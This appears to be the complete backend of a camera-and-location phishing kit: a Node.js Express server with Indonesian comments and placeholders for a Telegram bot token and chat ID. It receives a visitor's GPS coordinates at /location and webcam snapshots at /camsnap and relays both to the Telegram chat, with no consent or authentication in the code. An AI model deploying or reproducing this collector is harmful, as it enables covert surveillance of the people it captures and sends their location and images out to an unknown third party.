const express = require("express");
const fetch = require("node-fetch");

const app = express();
app.use(express.json({ limit: "20mb" }));

// 🔑 GANTI INI
const BOT_TOKEN = "ISI_BOT_TOKEN";
const CHAT_ID = "ISI_CHAT_ID";

// 📍 LOCATION
app.post("/location", async (req, res) => {
  try {
    const { lat, lon, acc } = req.body;

    const text = `📍 Lokasi:\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text
      })
    });

    res.send("OK");
  } catch (e) {
    console.log("Error location:", e);
    res.status(500).send("Error");
  }
});

// 📷 CAMERA
app.post("/camsnap", async (req, res) => {
  try {
    const { image } = req.body;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        photo: image
      })
    });

    res.send("OK");
  } catch (e) {
    console.log("Error cam:", e);
    res.status(500).send("Error");
  }
});

app.get("/", (req, res) => {
  res.send("Server aktif");
});

app.listen(3000, () => console.log("Server running"));
